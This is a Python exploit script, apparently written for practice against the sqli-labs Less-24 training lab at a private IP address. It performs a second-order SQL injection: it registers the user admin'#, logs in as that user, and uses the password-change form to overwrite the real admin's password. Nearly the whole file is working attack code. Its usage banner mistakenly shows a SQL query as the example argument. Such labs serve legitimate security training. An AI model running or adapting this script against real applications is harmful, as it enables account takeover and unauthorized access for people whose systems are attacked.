#!/usr/bin/env python

import requests
import re
import string
import sys

banner = '''
USAGE: python %s <New admin's password>
EXAMPLE: python %s "SELECT table_schema FROM information_schema.tables limit 0,1"
''' % (sys.argv[0], sys.argv[0])

if(len(sys.argv) != 2):
    print(banner)
    exit(0)
else:
    pass

url_1 = "http://172.16.214.227/sqli-labs/Less-24/index.php"
url_2 = "http://172.16.214.227/sqli-labs/Less-24/login_create.php"
url_3 = "http://172.16.214.227/sqli-labs/Less-24/login.php"
url_4 = "http://172.16.214.227/sqli-labs/Less-24/pass_change.php"
targetuser = "admin"
eviluser = "%s'#" % targetuser
newpassword = sys.argv[1]

header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "close",
}

# (1) Register admin'#.

query_1 = {
    "username": eviluser,
    "password": "pass",
    "re_password": "pass",
    "submit": "Register"
}

sessid = requests.get(url_1, headers=header, verify=False).cookies['PHPSESSID']
cookie = {'PHPSESSID': sessid}

print("[*] Register %s" % eviluser)

res = requests.post(url_2, headers=header, cookies=cookie, data=query_1, verify=False)

if(re.search('Redirecting you to login page', res.text)):
    print("[+] Succeeded in creating evil user")
else:
    print("[-] Failed to create evil user.")
    exit(0)

# (2) login with admin'#

query_2 = {
    "login_user": eviluser,
    "login_password": "pass",
    "mysubmit": "Login"
}

cookie = {'PHPSESSID': sessid}

res = requests.post(url_3, headers=header, cookies=cookie, data=query_2, verify=False, allow_redirects=False)

try:
    cookie['Auth'] = res.cookies['Auth']
    print("[+] Succeeded in login")
except:
    print("[-] Failed to login.")
    exit(0)

# (3) Abusing Second Order SQL Injection, change admin's password.

query_3 = {
    "current_password": "pass",
    "password": newpassword,
    "re_password": newpassword,
    "submit": "Reset"
}

print("[*] Change admin's password...")

res = requests.post(url_4, headers=header, cookies=cookie, data=query_3, verify=False)

if(re.search('Password successfully updated', res.text)):
    print("[+] Succeeded in changing password of admin.")
    print("[*] (USER) admin, (NEW PASSWORD) %s" % newpassword)
else:
    print("[-] Failed to change password.")
    exit(0)
